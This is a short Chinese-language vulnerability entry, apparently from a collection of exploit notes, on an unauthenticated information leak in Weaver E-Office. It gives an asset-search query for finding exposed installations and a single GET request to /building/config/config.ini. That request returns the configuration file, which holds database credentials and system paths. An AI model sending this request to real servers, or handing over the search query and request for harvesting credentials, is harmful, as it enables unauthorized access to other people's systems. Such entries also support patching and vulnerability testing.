---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 泛微E-Office config.ini 信息泄露漏洞

## 漏洞描述

泛微 E-Office 的 `/building/config/config.ini` 文件可被未授权直接访问。该文件为系统配置文件，包含数据库连接、系统路径等敏感配置信息，攻击者无需登录即可获取，为进一步攻击提供关键信息。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

```
GET /building/config/config.ini HTTP/1.1
```

若响应状态码为 200 且内容包含 `building` 等配置特征字段，则漏洞存在。响应中将返回完整的配置文件内容，包括数据库凭证、系统路径等敏感信息。
